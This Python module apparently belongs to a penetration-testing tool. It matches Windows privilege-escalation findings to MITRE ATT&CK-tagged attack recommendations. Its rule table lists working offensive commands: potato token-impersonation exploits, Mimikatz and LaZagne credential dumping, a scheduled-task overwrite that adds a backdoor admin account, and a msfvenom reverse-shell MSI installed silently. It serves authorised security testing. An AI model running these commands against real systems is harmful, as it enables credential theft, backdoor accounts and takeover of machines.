"""Seep recommendation engine — matches findings to tools and produces actionable guidance."""

from __future__ import annotations

from dataclasses import dataclass
from server.results.parser import Finding
from server.catalog.schemas import ToolCatalog, ToolEntry


# ---------------------------------------------------------------------------
# Static recommendation rules keyed by finding_id (or tag patterns).
# Each rule maps to a MITRE ATT&CK technique, risk level, and example commands.
# ---------------------------------------------------------------------------

RECOMMENDATIONS: list[dict] = [
    {
        "match_finding_ids": ["se_impersonate_enabled"],
        "match_tags": ["token-abuse"],
        "title": "Exploit SeImpersonatePrivilege via Potato Attack",
        "description": (
            "SeImpersonatePrivilege allows impersonating tokens obtained via COM or named pipe. "
            "Use a potato-style exploit (GodPotato, PrintSpoofer, JuicyPotato) to escalate to SYSTEM."
        ),
        "mitre_technique": "T1134.001",
        "mitre_name": "Access Token Manipulation: Token Impersonation/Theft",
        "risk": "critical",
        "tool_names": ["GodPotato.exe", "PrintSpoofer64.exe", "JuicyPotatoNG.exe"],
        "example_commands": [
            '.\\GodPotato.exe -cmd "cmd /c whoami"',
            ".\\PrintSpoofer64.exe -i -c cmd",
            ".\\JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe",
        ],
    },
    {
        "match_finding_ids": ["autologon_credentials"],
        "match_tags": ["credentials", "registry", "plaintext"],
        "title": "Harvest AutoLogon Plaintext Credentials",
        "description": (
            "AutoLogon credentials are stored in plaintext in the registry at "
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. "
            "Retrieve them and attempt lateral movement or privilege escalation with the exposed account."
        ),
        "mitre_technique": "T1552.002",
        "mitre_name": "Unsecured Credentials: Credentials in Registry",
        "risk": "critical",
        "tool_names": ["Mimikatz.exe", "LaZagne.exe"],
        "example_commands": [
            'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
            ".\\LaZagne.exe windows",
            '.\\Mimikatz.exe "sekurlsa::logonpasswords" exit',
        ],
    },
    {
        "match_finding_ids": ["unquoted_service_path"],
        "match_tags": ["unquoted-path", "services"],
        "title": "Abuse Unquoted Service Path for SYSTEM Execution",
        "description": (
            "An unquoted service binary path with spaces allows planting a malicious binary "
            "at a writable intermediate directory. Windows will execute it as the service user (often SYSTEM) "
            "on the next service start or system reboot."
        ),
        "mitre_technique": "T1574.009",
        "mitre_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
        "risk": "high",
        "tool_names": ["SharpUp.exe", "winPEASx64.exe"],
        "example_commands": [
            ".\\SharpUp.exe audit UnquotedServicePath",
            "# Plant payload at writable intermediate path, then restart service:",
            "sc stop CorpMonitor && sc start CorpMonitor",
        ],
    },
    {
        "match_finding_ids": ["saved_credentials_cmdkey"],
        "match_tags": ["credentials", "windows-credential-manager"],
        "title": "Use Saved Credentials for Lateral Movement",
        "description": (
            "Windows Credential Manager contains saved credentials accessible via cmdkey. "
            "Use 'runas /savecred' to execute commands as the stored account without knowing the password, "
            "or extract credentials via DPAPI."
        ),
        "mitre_technique": "T1550.002",
        "mitre_name": "Use Alternate Authentication Material: Pass the Hash",
        "risk": "high",
        "tool_names": ["Mimikatz.exe", "SharpDPAPI.exe"],
        "example_commands": [
            "runas /savecred /user:CORP\\backupadmin cmd.exe",
            ".\\SharpDPAPI.exe credentials",
            '.\\Mimikatz.exe "dpapi::cred /in:%appdata%\\Microsoft\\Credentials\\*" exit',
        ],
    },
    {
        "match_finding_ids": ["privileged_scheduled_task"],
        "match_tags": ["scheduled-tasks", "writable-file"],
        "title": "Hijack Writable Scheduled Task Script for SYSTEM Execution",
        "description": (
            "A scheduled task runs a script as SYSTEM that is writable by the current user. "
            "Overwrite the script with a payload (e.g., add a local admin, run a reverse shell) "
            "and wait for the scheduled trigger."
        ),
        "mitre_technique": "T1053.005",
        "mitre_name": "Scheduled Task/Job: Scheduled Task",
        "risk": "medium",
        "tool_names": ["PowerUp.ps1", "accesschk.exe"],
        "example_commands": [
            '.\\accesschk.exe -wvu "C:\\Scripts\\maintenance.ps1"',
            "# Overwrite with payload:",
            "echo 'net user hacker P@ss123! /add && net localgroup administrators hacker /add' > C:\\Scripts\\maintenance.ps1",
        ],
    },
    {
        "match_finding_ids": ["writable_autorun"],
        "match_tags": ["autoruns", "persistence"],
        "title": "Hijack Writable Autorun Path for Persistence",
        "description": (
            "A Run key references a binary in a publicly writable directory. "
            "Plant a malicious binary at the path to achieve persistent user-level code execution. "
            "If other privileged users also trigger the autorun, this may escalate privileges."
        ),
        "mitre_technique": "T1547.001",
        "mitre_name": "Boot or Logon Autostart Execution: Registry Run Keys",
        "risk": "medium",
        "tool_names": ["winPEASx64.exe", "Autoruns.exe"],
        "example_commands": [
            "# Place payload at the autorun path:",
            "copy payload.exe C:\\Users\\Public\\CorpApps\\updater.exe",
            "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        ],
    },
    {
        "match_finding_ids": [],
        "match_tags": ["patches", "missing-patches"],
        "title": "Identify Kernel / Local Privilege Escalation via Patch Gaps",
        "description": (
            "The patch history reveals gaps. Run Watson or Seatbelt to identify missing patches "
            "mapped to known local privilege escalation CVEs."
        ),
        "mitre_technique": "T1068",
        "mitre_name": "Exploitation for Privilege Escalation",
        "risk": "medium",
        "tool_names": ["Watson.exe", "Seatbelt.exe", "winPEASx64.exe"],
        "example_commands": [
            ".\\Watson.exe",
            ".\\Seatbelt.exe -group=patches",
            ".\\winPEASx64.exe systeminfo",
        ],
    },
    {
        "match_finding_ids": ["writable_path_dir"],
        "match_tags": ["dll-hijack", "path"],
        "title": "DLL Search Order Hijacking via Writable PATH",
        "description": (
            "One or more directories in the system PATH are writable by low-privileged users. "
            "An attacker can plant a malicious DLL with a name expected by a privileged process "
            "that searches PATH when loading DLLs. When the privileged process (e.g., a SYSTEM "
            "service) starts or reloads the DLL, the attacker's code executes with elevated "
            "privileges."
        ),
        "mitre_technique": "T1574.001",
        "mitre_name": "Hijack Execution Flow: DLL Search Order Hijacking",
        "risk": "high",
        "tool_names": ["accesschk.exe", "winPEASx64.exe", "PowerUp.ps1"],
        "example_commands": [
            ".\\accesschk.exe -wud C:\\SomePath",
            "# Use Process Monitor to observe DLL load order for target process",
            "# Plant malicious DLL at writable PATH directory with the expected name",
        ],
    },
    {
        "match_finding_ids": ["non_standard_services_raw"],
        "match_tags": ["services", "non-standard"],
        "title": "Modifiable Service Configuration",
        "description": (
            "Non-standard services running outside of protected Windows directories may have "
            "weak DACLs that allow unprivileged users to modify the service binary path, "
            "replace the binary, or change the service configuration. Exploiting a modifiable "
            "service grants code execution as the service account (often SYSTEM or a privileged "
            "domain account)."
        ),
        "mitre_technique": "T1574.010",
        "mitre_name": "Hijack Execution Flow: Services File Permissions Weakness",
        "risk": "high",
        "tool_names": ["SharpUp.exe", "PowerUp.ps1", "accesschk.exe"],
        "example_commands": [
            ".\\SharpUp.exe audit ModifiableServices",
            ".\\accesschk.exe -wuvc * 2>nul | findstr /i service",
            'powershell -ep bypass -c ". .\\PowerUp.ps1; Get-ModifiableService"',
        ],
    },
    {
        "match_finding_ids": ["writable_path_dir", "dll_hijack_raw"],
        "match_tags": ["path", "filesystem"],
        "title": "Writable System PATH Directories",
        "description": (
            "Directories listed in the system PATH environment variable are writable by the "
            "current low-privileged user. An attacker can place a malicious executable or DLL "
            "with the name of a legitimate binary into one of these directories. Any process "
            "that searches PATH before its own directory will execute the attacker's binary "
            "instead, potentially escalating privileges if the calling process runs as SYSTEM "
            "or a privileged account."
        ),
        "mitre_technique": "T1574.007",
        "mitre_name": "Hijack Execution Flow: Path Interception by PATH Environment Variable",
        "risk": "high",
        "tool_names": ["accesschk.exe", "winPEASx64.exe"],
        "example_commands": [
            '.\\accesschk.exe -wud "C:\\WritablePath"',
            "icacls C:\\WritablePath",
            "# Place malicious binary shadowing a system command in the writable directory",
        ],
    },
    {
        "match_finding_ids": ["always_install_elevated"],
        "match_tags": ["msi", "privilege-escalation"],
        "title": "AlwaysInstallElevated MSI Privilege Escalation",
        "description": (
            "Both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, allowing any "
            "user to install MSI packages with SYSTEM privileges. An attacker can craft a "
            "malicious MSI payload that adds a local administrator, executes a reverse shell, "
            "or performs any action as SYSTEM — without requiring any existing elevated access."
        ),
        "mitre_technique": "T1548.002",
        "mitre_name": "Abuse Elevation Control Mechanism: Bypass UAC",
        "risk": "critical",
        "tool_names": ["winPEASx64.exe", "SharpUp.exe"],
        "example_commands": [
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi",
            "msiexec /quiet /qn /i evil.msi",
            ".\\SharpUp.exe audit AlwaysInstallElevated",
        ],
    },
    {
        "match_finding_ids": ["web_config_connection_string"],
        "match_tags": ["web-config", "connection-string", "credentials"],
        "title": "Credentials in Web Configuration Files",
        "description": (
            "Plaintext credentials were found in web.config, appsettings.json, or similar "
            "configuration files. Connection strings and application settings frequently contain "
            "database usernames and passwords, API keys, or service account credentials. These "
            "can be used for lateral movement, database access, or direct privilege escalation "
            "if the credential belongs to a privileged account."
        ),
        "mitre_technique": "T1552.001",
        "mitre_name": "Unsecured Credentials: Credentials in Files",
        "risk": "high",
        "tool_names": ["Snaffler.exe", "SharpWeb.exe"],
        "example_commands": [
            ".\\Snaffler.exe -s -o snaffler.log",
            ".\\SharpWeb.exe all",
            '# Manually review: type C:\\inetpub\\wwwroot\\web.config | findstr /i "password connectionString"',
        ],
    },
]


@dataclass
class MatchedRecommendation:
    title: str
    description: str
    mitre_technique: str
    mitre_name: str
    mitre_url: str
    risk: str  # critical | high | medium | low | info
    tools: list[ToolEntry]
    tool_names_fallback: list[str]  # names used when catalog lookup yields nothing
    example_commands: list[str]
    triggered_by: list[str]  # finding_ids that triggered this rec

    @property
    def display_tools(self) -> list[str]:
        """Return tool display names (from catalog if available, else fallback names)."""
        if self.tools:
            return [t.display_name for t in self.tools]
        return self.tool_names_fallback


class RecommendationEngine:
    def __init__(self, catalog: ToolCatalog) -> None:
        self.catalog = catalog
        # Build a fast name→ToolEntry lookup (case-insensitive)
        self._tool_by_name: dict[str, ToolEntry] = {
            t.name.lower(): t for t in catalog.tools
        }

    def analyze(self, findings: list[Finding]) -> list[MatchedRecommendation]:
        """Match findings against rules and return de-duplicated recommendations."""
        finding_ids = {f.finding_id for f in findings}
        all_tags: set[str] = set()
        for f in findings:
            all_tags.update(f.tags)

        seen_titles: set[str] = set()
        results: list[MatchedRecommendation] = []

        for rule in RECOMMENDATIONS:
            triggered_by: list[str] = []

            # Match by finding_id
            for fid in rule["match_finding_ids"]:
                if fid in finding_ids:
                    triggered_by.append(fid)

            # Match by tags (if any rule tag is present in findings)
            if not triggered_by:
                for tag in rule["match_tags"]:
                    if tag in all_tags:
                        triggered_by.append(f"tag:{tag}")
                        break

            if not triggered_by:
                continue

            title = rule["title"]
            if title in seen_titles:
                continue
            seen_titles.add(title)

            # Resolve tools from catalog
            resolved_tools: list[ToolEntry] = []
            for tool_name in rule["tool_names"]:
                entry = self._tool_by_name.get(tool_name.lower())
                if entry:
                    resolved_tools.append(entry)

            mitre_tech = rule["mitre_technique"]
            mitre_url = (
                f"https://attack.mitre.org/techniques/{mitre_tech.replace('.', '/')}/"
            )

            results.append(
                MatchedRecommendation(
                    title=title,
                    description=rule["description"],
                    mitre_technique=mitre_tech,
                    mitre_name=rule["mitre_name"],
                    mitre_url=mitre_url,
                    risk=rule["risk"],
                    tools=resolved_tools,
                    tool_names_fallback=rule["tool_names"],
                    example_commands=rule["example_commands"],
                    triggered_by=triggered_by,
                )
            )

        # Sort: critical first, then high, medium, low, info
        _order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        results.sort(key=lambda r: _order.get(r.risk, 9))
        return results
